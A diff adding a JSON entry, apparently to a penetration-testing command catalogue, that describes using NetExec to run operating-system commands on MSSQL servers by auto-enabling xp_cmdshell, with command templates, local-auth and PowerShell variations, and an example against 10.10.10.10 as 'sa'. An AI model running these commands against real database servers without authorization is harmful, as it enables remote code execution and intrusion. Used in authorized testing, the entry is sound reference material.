@@ -1,0 +1,17 @@
+{
+  "id": "nxc-mssql-exec",
+  "name": "NetExec MSSQL Command Exec",
+  "command": "nxc mssql <target> -u '<user>' -p '<password>' -x '<command>'",
+  "description": "Execute OS commands through MSSQL — auto-enables xp_cmdshell if disabled and the account has sufficient privileges. The fastest path from sysadmin SQL login to RCE.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["mssql"],
+  "tags": ["netexec", "nxc", "mssql", "rce", "xp-cmdshell"],
+  "variations": [
+    { "label": "Local SQL Auth", "requires": "password", "command": "nxc mssql <target> -u 'sa' -p '<password>' --local-auth -x '<command>'" },
+    { "label": "PowerShell", "requires": "password", "command": "nxc mssql <target> -u '<user>' -p '<password>' -X '<powershell>'" }
+  ],
+  "examples": [
+    "nxc mssql 10.10.10.10 -u sa -p 'Password123!' --local-auth -x whoami"
+  ]
+}
